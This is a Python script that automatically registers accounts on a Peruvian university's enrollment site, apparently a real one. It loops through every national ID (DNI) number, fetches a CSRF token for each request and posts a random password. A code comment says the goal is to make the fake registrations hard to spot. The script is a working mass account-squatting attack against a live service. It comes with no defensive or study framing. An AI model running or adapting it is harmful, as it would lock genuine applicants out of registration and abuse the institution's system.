from bs4 import BeautifulSoup
import requests
import random

headers = {
    "Origin":"http://www.inscripciones.uni.edu.pe",
    "Upgrade-Insecure-Requests":1,
    "Content-Type":"application/x-www-form-urlencoded",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Referer":"http://www.inscripciones.uni.edu.pe/register",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"es-ES,es;q=0.9,en;q=0.8"
}

with open("lastOne.txt","r") as f:
    dni = int(f.read())
while dni<=99999999 :
    r = requests.get("http://www.inscripciones.uni.edu.pe/login");
    text = r.text
    soup = BeautifulSoup(text , features = "lxml").body
    token = soup.find_all('input')[0]['value']
    dni_str = str(dni)
    password = str(random.randint(100000,999999)) #Make difficult to find wich one is fake
    data = {
        '_token':token,
        'dni': dni,
        'password': password,
        'password_confirmation': password
    }
    r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
    if dni%50==0:
        print(str(dni)+":"+str(r.status_code))
        with open("lastOne.txt","w") as f:
            f.write(str(dni))
    dni+=1
